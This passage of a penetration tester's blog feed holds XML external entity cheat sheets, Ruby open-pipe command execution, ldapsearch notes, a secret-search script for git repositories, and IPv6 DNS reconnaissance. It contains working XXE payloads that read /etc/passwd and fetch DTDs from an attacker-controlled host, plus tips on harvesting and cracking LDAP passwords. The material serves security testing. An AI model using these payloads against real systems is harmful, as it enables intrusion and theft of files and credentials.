</span><span class='line'>&lt;!DOCTYPE root [&lt;!ENTITY % dtd SYSTEM "http://[IP]/some.dtd"&gt;&lt;!ENTITY % a "test %dtd"&gt;]&gt;</span></code></pre></td></tr></table></div></figure>


<p>Combined Entity and Parameter Entity:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;!DOCTYPE root [&lt;!ENTITY post SYSTEM "http://"&gt;&lt;!ENTITY % dtd SYSTEM "http://[IP]/some.dtd"&gt;&lt;!ENTITY % a "test %dtd"&gt;]&gt;&lt;root&gt;&post;&lt;/root&gt;</span></code></pre></td></tr></table></div></figure>


<p>URL handler. This follows <del><a href="http://publib.boulder.ibm.com/infocenter/wsadhelp/v5r1m2/topic/com.ibm.etools.xmlbuilder.doc/topics/cxmlcat.html">XML Entity - IBM (Broken)</a></del> I have not used this but Public DTD works just as well:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;!DOCTYPE root [&lt;!ENTITY c PUBLIC "-//W3C//TEXT copyright//EN" "http://[IP]/copyright.xml"&gt;]&gt;</span></code></pre></td></tr></table></div></figure>


<p>XML Schema Inline:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;madeuptag xlmns="http://[ip]" xsi:schemaLocation="http://[IP]"&gt;
</span><span class='line'>&lt;/madeuptag&gt;</span></code></pre></td></tr></table></div></figure>


<p>Remote Public DTD, from <u><a href="https://github.com/BuffaloWill/oxml_xxe">oxml_xxe payloads</a></u>:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;!DOCTYPE roottag PUBLIC "-//OXML/XXE/EN" "http://[IP]"&gt;</span></code></pre></td></tr></table></div></figure>


<p>External XML Stylesheet, from <u><a href="http://releases.portswigger.net/2015/08/1625.html">Burp Suite Release Notes</a></u>:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;?xml-stylesheet type="text/xml" href="http://[IP]"?&gt;</span></code></pre></td></tr></table></div></figure>


<p>XInclude:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;document xmlns:xi="http://&lt;IP&gt;/XInclude"&gt;&lt;footer&gt;&lt;xi:include href="title.xml"/&gt;&lt;/footer&gt;&lt;/document&gt;
</span><span class='line'>&lt;root xmlns:xi="http://www.w3.org/2001/XInclude"&gt;
</span><span class='line'>&lt;xi:include href="file:///etc/fstab" parse="text"/&gt;</span></code></pre></td></tr></table></div></figure>


<p>Inline XSLT:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;?xml-stylesheet type="text/xml" href="#mytest"?&gt;
</span><span class='line'>&lt;xsl:stylesheet id="mytest" version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:fo="http://www.w3.org/1999/XSL/Format"&gt;
</span><span class='line'>&lt;!-- replace with your XSLT attacks --&gt;
</span><span class='line'>&lt;xsl:import href="http://[ip]"/&gt;
</span><span class='line'>&lt;xsl:template match="id('boom')"&gt;
</span><span class='line'>  &lt;fo:block font-weight="bold"&gt;&lt;xsl:apply-templates/&gt;&lt;/fo:block&gt;
</span><span class='line'>&lt;/xsl:template&gt;
</span><span class='line'>&lt;/xsl:stylesheet&gt;</span></code></pre></td></tr></table></div></figure>


<p>Useful Links:</p>

<ul>
<li><a href="http://www.vsecurity.com/download/papers/XMLDTDEntityAttacks.pdf">XML Schema, DTD, and Entity Attacks - A Compendium of Known Techniques</a></li>
<li><a href="http://publib.boulder.ibm.com/infocenter/wsadhelp/v5r1m2/topic/com.ibm.etools.xmlbuilder.doc/topics/cxmlcat.html">XML Entity Examples - IBM (Broken, check Internet Archive)</a></li>
</ul>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Blackhat 2015 Arsenal]]></title>
    <link href="https://www.silentrobots.com/blog/2015/09/10/blackhat-2015-arsenal/"/>
    <updated>2015-09-10T17:56:34-04:00</updated>
    <id>https://www.silentrobots.com/blog/2015/09/10/blackhat-2015-arsenal</id>
    <content type="html"><![CDATA[<p>Last month at Blackhat Arsenal 2015, <a href="https://github.com/parzamendi-r7">Pete</a> and I (<a href="http://www.twitter.com/_will_is_">@<em>will_is</em></a>) presented on Serpico. This was our second time at Arsenal. Yet again, awesome people, great venue, and overall a highlight for me of BH/DC/LV. We got some excellent feedback on the project, so thank you to anyone who stopped by<!-- more -->.</p>

<p>Last year I posted the top 3 feature requests and we squashed them (woot!). These are requested features/bugs this year and their associated issue on github:</p>

<h1>Fix Image Breakage in Presentations</h1>

<p>Automated Presentation creation was added the week before and had a rather embarassing stack trace in certain combinations; this was fixed in <a href="https://github.com/MooseDojo/Serpico/commit/61fe996af37a79c94b34eea6fb5cf0a208fb87b5"> this commit</a></p>

<h1>Statistics</h1>

<p>More than a few people asked for more correlation; &ldquo;Support Findings Trending&rdquo; (<a href="https://github.com/MooseDojo/Serpico/issues/25">Issue 25</a>).</p>

<h1>Wiki Additions</h1>

<p>Add the following information to the wiki:</p>

<ul>
<li>Report Creation Example</li>
<li>Presentation Creation</li>
<li>Export/Import Examples</li>
</ul>


<h1>Submit To Kali</h1>

<p>Here is the submission: <a href="https://bugs.kali.org/view.php?id=2615">New Tool Request: SERPICO</a></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Simple Ruby Exec with Open and Pipe]]></title>
    <link href="https://www.silentrobots.com/blog/2015/04/14/simple_ruby_exec/"/>
    <updated>2015-04-14T00:00:00-04:00</updated>
    <id>https://www.silentrobots.com/blog/2015/04/14/simple_ruby_exec</id>
    <content type="html"><![CDATA[<p>I was researching something else and thought this was a cool way to execute a command through the open method in ruby:</p>

<!-- more -->


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>open("|[CMD]")</span></code></pre></td></tr></table></div></figure>


<p>The key is starting the open with pipe. For example,</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>open("|ls")</span></code></pre></td></tr></table></div></figure>


<p>Or to exec and print the result in one line:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>open("|ls").each {|out| puts out }</span></code></pre></td></tr></table></div></figure>


<p>Not sure where I saw it originally, but this is an interesting older read:
<a href="https://devver.wordpress.com/2009/06/30/a-dozen-or-so-ways-to-start-sub-processes-in-ruby-part-1/">https://devver.wordpress.com/2009/06/30/a-dozen-or-so-ways-to-start-sub-processes-in-ruby-part-1/</a></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Exploiting XXE Vulnerabilities in OXML Documents - Part 1]]></title>
    <link href="https://www.silentrobots.com/blog/2015/03/04/oxml_xxe/"/>
    <updated>2015-03-04T23:00:00-05:00</updated>
    <id>https://www.silentrobots.com/blog/2015/03/04/oxml_xxe</id>
    <content type="html"><![CDATA[<p>OXML is a common document format; think docx (Microsoft Word Document), pptx (Microsoft Powerpoint), xlsx (Excel Spreadsheet), etc.</p>

<!-- more -->


<p>An OXML document is a zip file containing XML files and any media files. When the document is rendered, the rendering library unzips the document and then parses the containing XML files. The order the XML files are parsed and which files maintain precedence over the others is dependent on the type of document. The following link is from Microsoft on the XML structure in Office 2007 files: <a href="https://msdn.microsoft.com/en-us/library/aa338205%28v=office.12%29.aspx#office2007aboutnewfileformat_structureoftheofficexmlformats">File format structure</a></p>

<p>I have had success in the past embedding XML External Entities into the XML files of a docx, the XXE is exploited when the document is parsed. An easy example of this would be in file upload functionality that allows docx, pptx, or xlsx. Facebook was found vulnerable to this exact scenario in December 2014; <a href="http://threatpost.com/xxe-bug-patched-in-facebook-careers-third-party-service">XXE Bug Patched in Facebook</a>.</p>

<p>If you review the Microsoft link posted earlier you will see that each XML file plays a different role. I have found varying levels of success in which XML file I embed the XXE exploit into. To help out with this testing process I wrote a tool:</p>

<p><a href="https://github.com/BuffaloWill/oxml_xxe">https://github.com/BuffaloWill/oxml_xxe</a></p>

<p>Keeping with 300 words or less I will stop here and pick up with oxml_xxe usage in the next blog post.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[ldapsearch notes]]></title>
    <link href="https://www.silentrobots.com/blog/2015/02/25/ldapsearch_notes/"/>
    <updated>2015-02-25T23:00:00-05:00</updated>
    <id>https://www.silentrobots.com/blog/2015/02/25/ldapsearch_notes</id>
    <content type="html"><![CDATA[<p>I seem to find open LDAP servers on the Internet more often than I should. Here are some notes on using ldapsearch</p>

<!-- more -->


<h1>Installing ldapsearch on Ubuntu</h1>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>apt-get install ldap-utils</span></code></pre></td></tr></table></div></figure>


<h1>Root-DSE object</h1>

<p>nmap includes a script to gather info from a LDAP root-dse object (<a href="http://nmap.org/nsedoc/scripts/ldap-rootdse.html">http://nmap.org/nsedoc/scripts/ldap-rootdse.html</a>). We can also use ldapsearch to test:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ldapsearch -p [PORT] -x -b "" -s base 'objectclass=*' -h [IP]</span></code></pre></td></tr></table></div></figure>


<p></p>

<h1>Open LDAP server</h1>

<p>Connect to an open LDAP server, john the ripper can be used to crack passwords that are returned:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ldapsearch -p [PORT] -x -h [IP] -b "dc=[y],dc=com"</span></code></pre></td></tr></table></div></figure>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Search all Github Repositories for an Organization]]></title>
    <link href="https://www.silentrobots.com/blog/2015/01/09/gumbler-updates/"/>
    <updated>2015-01-09T23:00:00-05:00</updated>
    <id>https://www.silentrobots.com/blog/2015/01/09/gumbler-updates</id>
    <content type="html"><![CDATA[<p><a href="https://github.com/BuffaloWill/gumbler">gumbler</a> is a script I wrote to search through git commits and introduced in the blog post <a href="http://www.silentrobots.com/blog/2014/10/06/gumbler/">&ldquo;Searching Through Git Commits&rdquo;</a>. Recently I wanted to run Gumbler across all repositories for an organization, the steps are discussed below. <!--more--></p>

<p>First, we need to grab a list of repositories for the ORG. This can be done using the API</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>curl "https://api.github.com/orgs/[ORG NAME]/repos?page=1&per_page=10000" &gt; repos.json
</span><span class='line'>curl "https://api.github.com/orgs/[ORG NAME]/repos?page=2&per_page=10000" &gt;&gt; repos.json
</span><span class='line'>...</span></code></pre></td></tr></table></div></figure>


<p>Note, the API limits the number of values returned so you will want to update the page count to make sure you get them all.</p>

<p>Next we iterate through each repository, clone it, and run gumbler across the repo. A simple Ruby script is given below. Note, ignore any repos that were forked as they aren&rsquo;t specific to the orgnization.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>require 'json'
</span><span class='line'>
</span><span class='line'># specify repos.json as an argument
</span><span class='line'>file = File.read(ARGV[0])
</span><span class='line'>
</span><span class='line'># parse the json
</span><span class='line'>data_hash = JSON.parse(file)
</span><span class='line'>
</span><span class='line'># iterate each hash
</span><span class='line'>data_hash.each do |hash|
</span><span class='line'>  # ignore forked repos
</span><span class='line'>  if !(hash["fork"])
</span><span class='line'>      puts "|+| Testing #{hash["name"]}"
</span><span class='line'>      
</span><span class='line'>      # clone the project
</span><span class='line'>      `git clone https://github.com/[ORG]/#{hash["name"]}.git`
</span><span class='line'>      
</span><span class='line'>      # Gumbler requires full directory paths
</span><span class='line'>      `ruby ~/gumbler/gumbler.rb -s -p #{hash["name"]} ~/[ORG]/results/`
</span><span class='line'>
</span><span class='line'>      sleep(3)
</span><span class='line'>  end
</span><span class='line'>end</span></code></pre></td></tr></table></div></figure>



]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Searching Through Git Commits]]></title>
    <link href="https://www.silentrobots.com/blog/2014/10/06/gumbler/"/>
    <updated>2014-10-06T00:00:00-04:00</updated>
    <id>https://www.silentrobots.com/blog/2014/10/06/gumbler</id>
    <content type="html"><![CDATA[<p><a href="https://github.com/BuffaloWill/gumbler">gumbler</a> is a script I wrote to search through git commits. Examples from github are discussed below.</p>

<!-- more -->


<h1>.gitignore</h1>

<p>A gitignore file is used to specify files that should not be tracked by git (source <a href="http://git-scm.com/docs/gitignore">gitignore</a>). In the default case, gumbler will read the gitignore file for the project and search every revision for a case where a file from gitignore was committed. Possible use cases would be as a pen tester looking for reconnaisance data (e.g. developer usernames/passwords, staging hosts/services, etc.) or a developer to verify projects did not previously commit “secret” data.</p>

<p>I am a big fan of what Netflix is doing with regards to open source and security. After looking through a number of their projects, I noticied Priam has a few commits with non-damaging files from the gitignore.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$. git clone https://github.com/Netflix/Priam.git
</span><span class='line'>Cloning into 'Priam'...
</span><span class='line'>....
</span><span class='line'>Checking connectivity... done.
</span><span class='line'>$. ruby gumbler/gumbler.rb Priam/ gumbler_testing/tmp/
</span><span class='line'>|-| Jumping to remote @directory Priam/
</span><span class='line'>|-| Storing every revision
</span><span class='line'>checking for *.com..
</span><span class='line'>checking for *.class..
</span><span class='line'>.....
</span><span class='line'>|+| Looking for .classpath, Found it in BRANCH : 697fd66aae9beed107e13f49a741455f1d9d8dd9 .classpath. Storing it in gumbler_testing/tmp/.
</span><span class='line'>|+| Looking for .classpath, Found it in BRANCH : 47bdb537789c034493e94d8977eae77ecbfd5b24 .classpath. Storing it in gumbler_testing/tmp/.
</span><span class='line'>|+| Looking for .classpath, Found it in BRANCH : 442862d4a8d4d18d0e176ded8795dd45a24528fc .classpath. Storing it in gumbler_testing/tmp/.
</span><span class='line'>....
</span><span class='line'>checking for .project..
</span><span class='line'>|+| Looking for .project, Found it in BRANCH : 697fd66aae9beed107e13f49a741455f1d9d8dd9 .project. Storing it in gumbler_testing/tmp/.
</span><span class='line'>|+| Looking for .project, Found it in BRANCH : 0941d9e0e0dda3ee1d9d4dda757d59ffb641abcf .project. Storing it in gumbler_testing/tmp/.
</span><span class='line'>|+| Looking for .project, Found it in BRANCH : 47bdb537789c034493e94d8977eae77ecbfd5b24 .project. Storing it in gumbler_testing/tmp/.
</span><span class='line'>....
</span><span class='line'>checking for .settings..
</span><span class='line'>....</span></code></pre></td></tr></table></div></figure>


<p>.classpath or .project are not damaging in this case and, hence, are used as the example. On a pen test or in collaborative projects I have found much worse (cough usernames, passwords). This shouldn’t be that surprising.</p>

<h1>Searching Commit Logs</h1>

<p>Another use case for gumbler is to look through commit history. Using Ruby on Rails as an example, we can search from for any commit with “CVE” in it. Gumbler will output a diff from the files changed in the commit.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$. ruby gumbler/gumbler.rb --grep CVE rails/ tmp/
</span><span class='line'>|!| skipping .gitignore, searching commit log for CVE
</span><span class='line'>$. ls tmp/
</span><span class='line'>060c91cd59ab86583a8f2f52142960d3433f62f5-2012-05-30_15:13:03_-0700.diff  88cc1688d0cb828c17706b41a8bd27870f2a2beb-2013-01-08_12:11:18_-0800.diff
</span><span class='line'>08d0a11a3f62718d601d39e617c834759cf59bbb-2014-02-18_15:38:50_-0300.diff  8be6913990c30f63618173da722148892348dcc9-2013-03-15_17:45:53_-0700.diff
</span><span class='line'>0b58a7ff420d7ef4b643c521a62be7259dd2f5cb-2011-02-08_14:21:12_-0800.diff  8e577fe560d5756fcc67840ba304d79ada6804e4-2013-01-08_12:41:24_-0800.diff
</span><span class='line'>0c7ac34aed1845044cd1911e5a775366d7ca41c1-2013-12-02_16:42:16_-0800.diff  9340f89849606dba02f44038171f3837f883fd4e-2012-05-30_15:09:13_-0700.diff
</span><span class='line'>2392535f4085d88186097e3c23414e958fb1d16d-2013-03-18_10:17:32_-0700.diff  93fb4c1e62dc9605eecbfaffda2becc85890fa5f-2014-07-10_10:20:16_-0700.diff
</span><span class='line'>...
</span><span class='line'>$. cat 060c91cd59ab86583a8f2f52142960d3433f62f5-2012-05-30_15\:13\:03_-0700.diff 
</span><span class='line'>060c91cd59ab86583a8f2f52142960d3433f62f5-2012-05-30 15:13:03 -0700==&gt; 2012-05-30 15:13:03 -0700 Strip [nil] from parameters hash. Thanks to Ben Murphy for reporting this! Strip [nil] from parameters hash.
</span><span class='line'>Thanks to Ben Murphy for reporting this!
</span><span class='line'>
</span><span class='line'>CVE-2012-2660
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>:100644 100644 aa5ba3e... 6757a53... M    actionpack/lib/action_dispatch/http/request.rb
</span><span class='line'>:100644 100644 c3f009a... 6ea66f9... M    actionpack/test/dispatch/request/query_string_parsing_test.rb
</span><span class='line'>
</span><span class='line'>diff --git a/actionpack/lib/action_dispatch/http/request.rb b/actionpack/lib/action_dispatch/http/request.rb
</span><span class='line'>index aa5ba3e..6757a53 100644
</span><span class='line'>--- a/actionpack/lib/action_dispatch/http/request.rb
</span><span class='line'>+++ b/actionpack/lib/action_dispatch/http/request.rb
</span><span class='line'>....</span></code></pre></td></tr></table></div></figure>


<p>As the README says, be careful using the tool as it uses Command Execution to search. A malicious git project could take advantage of this. Ping me with better ways to handle this.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[XML Entity Cheatsheet]]></title>
    <link href="https://www.silentrobots.com/blog/2014/09/03/xe-cheatsheet/"/>
    <updated>2014-09-03T00:00:00-04:00</updated>
    <id>https://www.silentrobots.com/blog/2014/09/03/xe-cheatsheet</id>
    <content type="html"><![CDATA[<p>An XML Entity testing cheatsheet. Testing was done using an older vulnerable version of nokogiri. In IRB you can require previous versions of gems. Certain techniques (e.g. XInclude) may require additional settings in Nokogiri.</p>

<!-- more -->


<p>XML Headers:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;?xml version="1.0" standalone="no"?&gt;
</span><span class='line'>&lt;?xml version="1.0" standalone="yes"?&gt;</span></code></pre></td></tr></table></div></figure>


<p>Vanilla entity test:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;!DOCTYPE root [&lt;!ENTITY post "1"&gt;]&gt;&lt;root&gt;&post;&lt;/root&gt;</span></code></pre></td></tr></table></div></figure>


<p>SYSTEM entity test (xxe):</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;!DOCTYPE root [&lt;!ENTITY post SYSTEM "file:///etc/passwd"&gt;]&gt;
</span><span class='line'>e.g.
</span><span class='line'>doc = Nokogiri::XML("&lt;!DOCTYPE root [ &lt;!ENTITY spl SYSTEM \"file:///etc/passwd\"&gt; ]&gt;\n&lt;a&gt;&spl;&lt;/a&gt;")
</span><span class='line'>doc.children.children.children.text</span></code></pre></td></tr></table></div></figure>


<p>Parameter Entity Test. One of the benefits is a paremeter entity is automatically expanded inside the DOCTYPE:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;!DOCTYPE root [&lt;!ENTITY % dtd SYSTEM "http://[IP]/some.dtd"&gt;&lt;!ENTITY % a "test %dtd"&gt;]&gt;
</span><span class='line'>e.g.
</span><span class='line'>options = Nokogiri::XML::ParseOptions::DTDATTR
</span><span class='line'>doc = Nokogiri::XML::Document.parse("&lt;!DOCTYPE test [&lt;!ENTITY % dtd SYSTEM \"http://172.16.122.177/student.dtd\"&gt;&lt;!ENTITY % a "test %dtd"&gt;]&gt;\n&lt;test&gt;success&lt;/test&gt;", nil, nil, options)
</span><span class='line'>doc.children.text</span></code></pre></td></tr></table></div></figure>


<p>Combined Entity and Parameter Entity:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;!DOCTYPE root [&lt;!ENTITY post SYSTEM "http://"&gt;&lt;!ENTITY % dtd SYSTEM "http://[IP]/some.dtd"&gt;&lt;!ENTITY % a "test %dtd"&gt;]&gt;&lt;root&gt;&post;&lt;/root&gt;</span></code></pre></td></tr></table></div></figure>


<p>XInclude:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;document xmlns:xi="http://&lt;IP&gt;/XInclude"&gt;&lt;footer&gt;&lt;xi:include href="title.xml"/&gt;&lt;/footer&gt;&lt;/document&gt;
</span><span class='line'>&lt;root xmlns:xi="http://www.w3.org/2001/XInclude"&gt;
</span><span class='line'>&lt;xi:include href="file:///etc/fstab" parse="text"/&gt;</span></code></pre></td></tr></table></div></figure>


<p>URL handler. This follows <a href="http://publib.boulder.ibm.com/infocenter/wsadhelp/v5r1m2/topic/com.ibm.etools.xmlbuilder.doc/topics/cxmlcat.html]">XML Entity - IBM</a> I have not seen this work “in the wild”. Should be useful for exfiltration testing:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;!DOCTYPE root [&lt;!ENTITY c PUBLIC "-//W3C//TEXT copyright//EN" "http://[IP]/copyright.xml"&gt;]&gt;</span></code></pre></td></tr></table></div></figure>


<p>XML Schema Inline:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;madeuptag xlmns="http://[ip]" xsi:schemaLocation="http://[IP]"&gt;
</span><span class='line'>&lt;/madeuptag&gt;</span></code></pre></td></tr></table></div></figure>


<p>Remote XML Schema. Also, have not been able to get this to work:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;!DOCTYPE root PUBLIC "abc/Catalog" "http://[IP]/catalog.dtd"&gt;</span></code></pre></td></tr></table></div></figure>


<p>Useful Links:</p>

<ul>
<li><a href="http://publib.boulder.ibm.com/infocenter/wsadhelp/v5r1m2/topic/com.ibm.etools.xmlbuilder.doc/topics/cxmlcat.html">XML Entity Examples - IBM</a></li>
<li><a href="http://www.vsecurity.com/download/papers/XMLDTDEntityAttacks.pdf">XML Schema, DTD, and Entity Attacks - A Compendium of Known Techniques</a></li>
<li><a href="https://www.owasp.org/index.php/Testing_for_XML_Injection_%28OTG-INPVAL-008%29">OWASP Testing for XML Entity Injection</a></li>
</ul>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[IPv6 DNS Guessing Notes]]></title>
    <link href="https://www.silentrobots.com/blog/2014/08/19/ipv6-dns-reconnaisance/"/>
    <updated>2014-08-19T00:00:00-04:00</updated>
    <id>https://www.silentrobots.com/blog/2014/08/19/ipv6-dns-reconnaisance</id>
    <content type="html"><![CDATA[<p>A hostname with an IPv6 address is stored as a AAAA resource record in DNS (see <a href="http://en.wikipedia.org/wiki/AAAA_record">AAAA record</a>). There are many DNS hostname bruteforcing tools, personally I like <a href="http://ha.ckers.org/fierce/">Fierce</a>. Suppose we have already run our hostname bruteforcing tool against a target domain (e.g. facebook.com). Below we use dig to do a AAAA record lookup for each hostname. <!--more-->Note, the DNS server we use matters. In this example we use 8.8.8.8, to confirm different results try using a.ns.facebook.com instead. Host can also be used instead of dig:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$&gt; cat fb_hosts.txt | while read line; do echo $line" Results:" && dig @8.8.8.8 +noall +answer AAAA $line && echo; done
</span><span class='line'>mobile.facebook.com Results:
</span><span class='line'>
</span><span class='line'>ipv6.facebook.com Results:
</span><span class='line'>
</span><span class='line'>www.facebook.com Results:
</span><span class='line'>www.facebook.com. 1903    IN  CNAME   star.c10r.facebook.com.
</span><span class='line'>star.c10r.facebook.com.   30  IN  AAAA    2a03:2880:f00b:900:face:b00c:0:1</span></code></pre></td></tr></table></div></figure>


<p>An offline/quieter way is to use the <a href="https://scans.io/study/sonar.fdns">DNS Record (ANY)</a> set from the Internet-Wide Scan Data Repository done by Rapid7. Using facebook.com as an example again:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$&gt; pigz -dc 20140310_dnsrecords.gz | grep -i "\.facebook\.com" | grep AAAA</span></code></pre></td></tr></table></div></figure>


<p>This didn&rsquo;t turn up very many results but we can combine the two:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$&gt; pigz -dc 20140310_dnsrecords.gz | zgrep "\.facebook\.com" | grep ",A," | cut -d"," -f1 | while read line; do echo $line" Results:" && dig @8.8.8.8 +noall +answer AAAA $line && echo; done
</span><span class='line'>...
</span><span class='line'>z.c10r.facebook.com Results:
</span><span class='line'>z.c10r.facebook.com.    59      IN      AAAA    2a03:2880:f00b:305:face:b00c:0:1
</span><span class='line'>...</span></code></pre></td></tr></table></div></figure>


<p>You get the idea =). Not a new concept or technique, just wanted to put some notes in one place.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Blackhat 2014 Arsenal Experience]]></title>
